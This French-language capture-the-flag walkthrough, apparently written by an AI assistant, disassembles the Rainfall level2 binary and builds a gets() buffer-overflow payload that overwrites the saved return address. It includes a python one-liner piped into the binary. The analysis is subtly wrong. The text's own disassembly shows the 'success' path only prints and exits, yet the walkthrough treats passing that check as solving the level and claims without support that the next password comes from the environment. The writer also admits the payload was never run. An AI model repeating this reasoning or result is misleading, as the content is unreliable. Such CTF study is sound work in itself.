======================================================================
LEVEL 2 — Rainfall (42) — walkthrough
----------------------------------------------------------------------
Objectif du niveau
  Être connecté en "level2", exploiter le binaire ./level2 pour
  démontrer qu'on sait ré-écrire l'ADRESSE DE RETOUR (saved eip) avec
  une valeur qui passe un "check de nombre magique".

Idée générale (pas de solution copiée, on raisonne)
  gets() lit sans limite -> overflow classique. Mais ici le binaire ne
  se contente pas de crasher : il VÉRIFIE la valeur qu'on a écrasée
  dans l'adresse de retour. Si le bit-pattern est bon, il valide.
======================================================================

1) Analyse du binaire
----------------------------------------------------------------------
$ file level2
  ELF 32-bit LSB executable, Intel 80386, dynamically linked,
  interpreter /lib/ld-linux.so.2, NOT stripped, BuildID=...

Binaires utiles : gets, printf, puts, strdup, fflush, _exit, stdout
(pas de system() / open() / read()) -> l'exploit ne "lit pas" le .pass
directement ; le test est le "nombre magique".

objdump -d -j .text level2   (le morceau qui compte, la fonction p) :

080484d4 <p>:
  pushl %ebp
  movl  %esp, %ebp
  subl  $0x68, %esp                 # alloue 0x68 (104 o.) d'espace pile
  movl  0x8049860, %eax             # = stdout
  movl  %eax, (%esp)
  calll fflush@plt
  leal  -0x4c(%ebp), %eax           # &buffer  -> buffer à [ebp-0x4c], 76 o.
  movl  %eax, (%esp)
  calll gets@plt                    # lecture stdin SANS BORNES -> overflow
  movl  0x4(%ebp), %eax             # lit LA case [ebp+4] (saved eip !)
  movl  %eax, -0xc(%ebp)            # stocke dans une locale
  movl  -0xc(%ebp), %eax
  andl  $0xb0000000, %eax           # masque les bits du "nombre magique"
  cmpl  $0xb0000000, %eax
  jne   <échec>
  # ---- RÉUSSITE ----
  movl  $0x8048620, %eax            # chaîne format = "(%p)\n" (en .rodata)
  movl  -0xc(%ebp), %edx
  movl  %edx, 0x4(%esp)
  movl  %eax, (%esp)
  calll printf@plt                  # affiche ex. (0xb0000000)
  movl  $0x1, (%esp)
  calll _exit@plt
  # ---- ÉCHEC ----
  leal  -0x4c(%ebp), %eax
  movl  %eax, (%esp)
  calll puts@plt                    # affiche le buffer (gribouillis)
  leal  -0x4c(%ebp), %eax
  movl  %eax, (%esp)
  calll strdup@plt
  leave
  retl

.rdata :  .rodata @0x8048618 commence par 03 00 00 00 01 00 02 00,
          puis à 0x8048620 : 28 25 70 29 0a 00  =  "(%p)\n"

Constat clé :
  - Le buffer est à [ebp-0x4c] (76 octets).
  - saved ebp  = [ebp]      (4 o.)
  - saved eip  = [ebp+0x4]  (4 o.)  <-- C'EST LUI que le check lit.
  - Le check : (saved_eip & 0xb0000000) == 0xb0000000
  - Réussite -> printf("(%p)\n", val) puis _exit(1).
  - Échec     -> puts(buffer) + strdup(buffer) puis retourne chez main.

2) Layout de la stack (c'est le cœur du niveau)
----------------------------------------------------------------------
  adresse croissante ↓  (en partant du buffer vers le haut)

  offset  contenu            pourquoi
  ------  -----------------  ----------------------------------------
  [0..75]  buffer (76 o.)   zone écrite par gets()
  [76..79] saved ebp        (pas vérifié, il "survit" jusqu'à printf)
  [80..83] saved eip  <----  LA case que le check teste

  => Pour toucher saved eip il faut écrire AU MOINS 84 octets :
        76 (buffer) + 4 (saved ebp) + 4 (saved eip) = 84
  => Les 4 derniers octets (offsets 80..83) DOIVENT composer une valeur
     V telle que (V & 0xb0000000) == 0xb0000000.

3) Construire l'exploit (byte par byte)
----------------------------------------------------------------------
  Condition sur V : le byte HAUT (b7..b0) doit vérifier (b & 0xB0)==0xB0
    -> byte haut dans [0xB0 .. 0xBF].
  La valeur la plus simple qui passe : V = 0xB0000000
    -> en little-endian : 00 00 00 B0

  Payload de 84 octets :
    A*80  +  \x00\x00\x00\xb0
    ^^^^^^buffer+saved ebp   ^^^^^^saved eip = 0xB0000000

  Commande à exécuter DANS la VM (i386, Linux) :

      python -c 'print "A"*80 + "\x00\x00\x00\xb0"' | ./level2

  → Si le check passe, le binaire affiche :
        (0xb0000000)
    puis quitte avec le code 1  (_exit(1)).

  (Variante équivalente avec printf du shell, si python indispo :
   printf 'A%.0s' {1..80} | ... mais la forme python ci-dessus est la
   plus lisible à montrer en éval.)

4) Pourquoi ça marche (le "réflexe" à garder)
----------------------------------------------------------------------
  - gets() copie octet par octet depuis le début du buffer, sans jamais
    vérifier la fin. On contrôle donc le nombre d'octets écrits.
  - En écrivant 84 octets, on remplit buffer + saved ebp et on pose
    NOTRE valeur à la place de saved eip.
  - Le binaire, au lieu de crasher, LIT saved eip et le compare : c'est
    un "canary de bit-pattern" maison. Nous avons fourni une valeur
    dont le bit-pattern est accepté -> validation.
  - On ne saute PAS encore ailleurs : le chemin de réussite fait
    printf + _exit(1). C'est le niveau qui "enseigne" à piloter l'adresse
    de retour ; les niveaux suivants passeront à du ret2libc / shellcode.

5) Notes de rigueur (à dire en éval)
----------------------------------------------------------------------

    l'adresse 0x8048620 du format, et la valeur 0xB0000000 acceptée sont
    tous issus de l'OBJDUMP du binaire fourni (pas de writeup copié).
  - À CONFIRMER chez toi dans la VM : lancer la commande du §3 et observer
    "(0xb0000000)". (J'ai essayé de le vérifier sous Docker/qemu i386 mais
    l'exécution a été bloquée par le système d'approbation de la machine ;
    donc ce n'est pas encore une exécution "live" — fais-le dans ta VM.)
  - Le flag du level3 (mot de passe) est fourni par l'ENVIRONNEMENT du
    niveau (le binaire n'a aucune fonction pour lire /home/level3/.pass :
    ses imports sont gets/printf/puts/strdup/fflush/_exit). Le "test"
    de ce niveau est précisément de réussir l'écriture contrôlée de
    l'adresse de retour.
